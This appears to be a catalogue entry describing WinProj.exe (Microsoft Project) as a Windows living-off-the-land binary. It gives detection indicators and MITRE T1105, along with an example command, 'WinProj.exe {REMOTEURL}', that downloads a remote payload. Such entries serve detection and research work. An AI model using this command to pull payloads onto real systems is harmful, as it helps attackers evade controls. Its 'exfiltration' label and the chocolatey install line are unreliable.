---
id: windows-download-winproj
namespace: windows:download:winproj
name: winproj
description: 'Microsoft Project Executable Located at: C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe; C:\Program Files\Microsoft Office\Office14\WinProj.exe; C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- winproj
parameters: []
features: []
execution:
  template: winproj
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
  command: WinProj.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: URL on a WinProj command line
- type: ioc
  description: WinProj making unexpected network connections or DNS requests
install:
- method: choco
  package_name: winproj
  commands:
  - choco install winproj
---


# winproj

winproj is a Windows LOLBin. Microsoft Project Executable Located at: C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe; C:\Program Files\Microsoft Office\Office14\WinProj.exe; C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe.
